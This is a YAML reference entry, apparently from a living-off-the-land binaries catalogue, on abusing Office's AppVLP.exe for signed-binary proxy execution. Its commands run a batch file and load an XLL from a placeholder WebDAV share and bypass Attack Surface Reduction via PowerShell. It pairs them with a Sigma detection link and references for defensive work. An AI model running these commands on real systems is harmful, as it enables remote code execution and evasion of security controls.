---
Name: Appvlp.exe
Description: Application Virtualization Utility Included with Microsoft Office 2016
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: AppVLP.exe \\webdav\calc.bat
    Usecase: Execution of BAT file hosted on Webdav server.
    Description: Executes calc.bat through AppVLP.exe
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 10 w/Office 2016
  - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
    Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
    Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 10 w/Office 2016
  - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
    Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
    Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 10 w/Office 2016
Full_Path:
  - Path: C:\Program Files\Microsoft Office\root\client\appvlp.exe
  - Path: C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/8b170ff5628376c87632635a5fde4e48bba70275/rules/windows/builtin/win_asr_bypass_via_appvlp_re.yml
Resources:
  - Link: https://github.com/MoooKitty/Code-Execution
  - Link: https://twitter.com/moo_hax/status/892388990686347264
  - Link: https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/
  - Link: https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/
Acknowledgement:
  - Person: fab
    Handle: '@0rbz_'
  - Person: Will
    Handle: '@moo_hax'
  - Person: Matt Wilson
    Handle: '@enigma0x3'
---
